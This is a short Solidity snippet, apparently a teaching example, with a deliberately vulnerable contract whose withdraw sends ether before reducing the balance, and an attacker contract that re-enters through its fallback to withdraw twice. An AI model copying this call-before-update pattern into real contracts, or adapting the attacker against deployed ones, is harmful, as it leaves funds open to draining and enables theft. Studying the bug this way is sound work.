```solidity
contract VulContract {
    mapping(address=>uint) balances;
    constructor() public payable{}
    function claim() public {
        balances[msg.sender] = 1000000000;
    }
    function withdraw(uint amount)  public {
        require(balances[msg.sender] >= amount);
        (bool success, bytes memory ret) = msg.sender.call.value(amount)("");
        balances[msg.sender] -= amount;
        require(success);
    }
}

contract Atacker {
    bool reentered = false;
    event recvValue(uint amount);
    function attack(address target) public {
        VulContract c = VulContract(target);
        c.claim();
        c.withdraw(1000000000);
    }
    fallback() external payable {
        emit recvValue(msg.value);
        VulContract c = VulContract(msg.sender);
        if (reentered) {
            return;
        }
        reentered = true;
        c.withdraw(msg.value);
    }
}
```